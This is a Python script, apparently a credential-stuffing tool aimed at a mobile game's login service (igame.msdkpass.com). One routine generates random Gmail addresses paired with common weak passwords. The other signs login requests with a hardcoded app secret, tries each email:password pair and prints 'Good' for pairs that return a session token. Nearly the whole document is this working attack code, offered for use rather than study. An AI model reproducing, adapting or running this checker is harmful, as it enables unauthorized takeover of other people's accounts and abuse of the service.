import requests, hashlib, random, string, time

r = requests.session()
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[1;32m' #اخضر
A = '\033[1;34m'#ازرق
C = '\033[1;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
import pyfiglet,sys

lo = pyfiglet.figlet_format(" H S O ")

def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0030)
j(A+ lo)
 
print(F+'*'*60)
ID = input(f' {C}[01] {X} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃 : ')
token = input(f' {C}[02] {X} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 : ' )
print('\n')
print(A+'*'*60)

def CHECK():
 for x in open('F.txt', 'r').read().splitlines():
     email = x.split(':')[0]
     pess = x.split(':')[1]
     pes = hashlib.md5(bytes((f"{pess}"), encoding='utf-8')).hexdigest()
     J = hashlib.md5(bytes(('/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{"account":"' + email + '","account_type":1,"area_code":"","extra_json":"","password":"' + pess + '"}3ec8cd69d71b7922e2a17445840866b26d86e283'), encoding='utf-8')).hexdigest()
     
     url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
     
     he = {'Content-Type':'application/json; charset=utf-8', 
 'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)',  'Host':'igame.msdkpass.com',  'Connection':'Keep-Alive',  'Accept-Encoding':'gzip',  'Content-Length':'126'}

     data = {
     "account": email ,
     "account_type":1,
     "area_code":"",
     "extra_json":"",
     "password":pess, 
     
     }
    
     req = requests.get(url, data=data, headers=he).text
     if '"token"' in req:
         print(F+' Good '+' : '+email +' : '+pess)
     else:
         print('\n')
         print(Z+' Bad '+' : '+email +' : '+pess)


import random

user='1234567890qwertyuiopasdfghjklzxcvbnm.'
num='56789'


ppas = ['1122334455', '1111122222', '1234512345', '1234554321', '12121212','qwer123','aassddff','qqwweerr','07800780','07700770','07810781','19991999','20002000']

def use():
      
      while True:
          rng=int("".join(random.choice(num)for i in range(1)))
          name=str("".join(random.choice(user)for i in range(rng)))
          jj=()
          j = str("".join(random.choice(user)for i in range(3)))
          
          e = name
          p = random.choice(ppas)
          n = f'{j}{e}@gmail.com:{p}'
          with open('F.txt', 'a') as file:
              file.write(n + '\n')
              print(n)
              
def n():
    dd = '''
• 𝑵𝑴𝑷𝑬𝑹 [01] 𝑪𝑶𝑵𝑺𝑻 𝑳𝑰𝑺𝑻  
• 𝑵𝑴𝑷𝑬𝑹 [02] 𝑪𝑯𝑬𝑪𝑲 𝑳𝑰𝑺𝑻   
    
    '''
    print(F+dd)
    na = input(' 𝑬𝑵𝑻𝑬𝑹 𝒀𝑶𝑼𝑹 𝑵𝑴𝑷𝑬𝑹 : ')
    if '1' in na:
        CHECK()
        
    if '2' in na:
        use()

n()